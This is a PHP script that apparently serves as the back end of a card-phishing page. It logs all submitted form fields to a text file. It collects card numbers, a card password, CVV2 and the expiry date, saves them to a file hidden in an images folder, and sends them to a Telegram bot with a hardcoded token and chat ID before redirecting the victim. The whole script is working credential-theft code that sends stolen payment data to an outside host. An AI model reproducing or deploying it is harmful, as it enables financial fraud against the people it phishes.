<?php
$handle = fopen("d/i.txt", "a");
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, " = ");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
if($_POST['CARD1']){
  $cards = $_POST['CARD1'];
  $cardss = $_POST['CARD2'];
  $cardsss = $_POST['CARD3'];
  $cardssss = $_POST['CARD4'];
  $pass = $_POST['PASSWORD'];
  $cvv = $_POST['CVV2'];
  $mah = $_POST['MONTH'];
  $sal = $_POST['YEARS'];
function getUserIP()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }
    return $ip;
}
$user_ip = getUserIP();
$protocol = $_SERVER['SERVER_PROTOCOL'];
    $port = $_SERVER['REMOTE_PORT'];
    $agent = $_SERVER['HTTP_USER_AGENT'];
    $ref = $_SERVER['HTTP_REFERER'];
    $hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
    file_put_contents("css/images/i.txt","$cards$cardss$cardsss$cardssss:$pass:$cvv:$sal:$mah");
    $token = "489030373:AAGCS3cr2RJknS0RHHZHsricQNeXdloVn8w"; //YourBotToken
     $textmsg = "
 !New Card Added 🍉 
➖➖➖➖➖➖➖
💳 Card : $cards $cardss $cardsss $cardssss

📌 Pass : $pass

✏️ CVV2 : $cvv

🔖 $sal:$mah
➖➖➖➖➖➖➖
🔅Channel Telegram🔅 Telegram.me/Paypal";

     $gpid = 75224801; //ChatID

     $send = file_get_contents("https://api.telegram.org/bot$token/SendMessage?chat_id=$gpid&text=".urlencode($textmsg));
}else{
    echo "):";
}
?>
<meta content='0;url=ip.php' http-equiv='refresh'/>
